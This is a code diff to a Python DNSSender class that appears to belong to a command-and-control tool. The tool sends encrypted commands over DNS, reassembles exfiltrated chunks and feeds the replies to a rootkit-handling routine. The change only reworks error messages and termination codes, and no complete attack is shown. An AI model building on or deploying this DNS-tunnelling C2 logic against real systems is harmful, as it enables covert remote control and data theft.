@@ -71,47 +71,51 @@ class DNSSender:
 
     def send(self, message: str) -> str:
         if (len(self.exfil_buffer) > 0):
+            msg = "[DNS] Cannot send new command. Please wait for the previous command to complete."
             self.owner._command_history.append(
                 {"command": message, 
                  "stdout": "", 
-                 "stderr": "[DNS] Cannot send new command. Please wait for the previous command to complete.", 
-                 "termination_code": ""})
-            return ""
+                 "stderr": msg, 
+                 "termination_code": "Undefined"})
+            return msg
         
         if (len(message) == 0): 
-            print("[DNS] Empty message, nothing to send.")
-            return ""
+            msg = "[DNS] Empty message, nothing to send."
+            print(msg)
+            return msg
        
         # Encrypt the message using AES-CBC
         message_encrypted = self._crypto.encrypt(message)
 
         if (len(message_encrypted) >= 255):
+            msg = "[DNS] Message too long to send via DNS (max 255 char)."
             self.owner._command_history.append(
                 {"command": message, 
                  "stdout": "", 
-                 "stderr": "[DNS] Message too long to send via DNS (max 255 char).", 
-                 "termination_code": ""})
-            return ""
+                 "stderr": msg, 
+                 "termination_code": "Undefined"})
+            return msg
 
         # Push into global queue
         self.command_queue.append(message_encrypted)
 
         # Poll‐assemble-decrypt.
         raw = self.assemble_exfil()
-        if raw is None: 
+        if raw is None:
+            msg = "[DNS] Timeout while waiting for all chunks. Returning empty data."
             self.owner._command_history.append(
                 {"command": message, 
                  "stdout": "", 
-                 "stderr": "[DNS] Message too long to send via DNS (max 255 char).", 
-                 "termination_code": ""})
-            return ""
+                 "stderr": msg, 
+                 "termination_code": "Undefined"})
+            return msg
 
         # Decrypt the received data
         raw_decrypted = self._crypto.decrypt(raw)
         print(f"[DNS] Decrypted received response: {raw_decrypted}")
         
         # Update in BigMama attributes
-        self.owner._command_history.append({"command": message, "stdout": "", "stderr": "", "termination_code": ""})
+        self.owner._command_history.append({"command": message, "stdout": "", "stderr": "", "termination_code": "Undefined"})
         self.owner._check_rootkit_command(raw_decrypted)
         self.owner._update_command_history(raw_decrypted)
 
